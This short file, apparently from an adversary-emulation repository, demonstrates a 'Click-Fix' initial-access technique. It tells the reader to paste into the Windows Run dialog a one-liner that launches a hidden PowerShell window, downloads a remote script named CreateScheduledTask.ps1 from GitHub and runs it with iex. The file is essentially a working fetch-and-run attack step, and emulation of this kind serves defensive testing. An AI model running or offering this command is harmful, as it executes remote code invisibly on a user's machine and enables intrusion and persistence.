:: Initial Access through Click-Fix
:: Open Run Terminal and paste the below code

conhost.exe cmd.exe /c powershell.exe -w hidden -c "iex (iwr -uri 'https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/CreateScheduledTask.ps1' -UseBasicParsing).Content"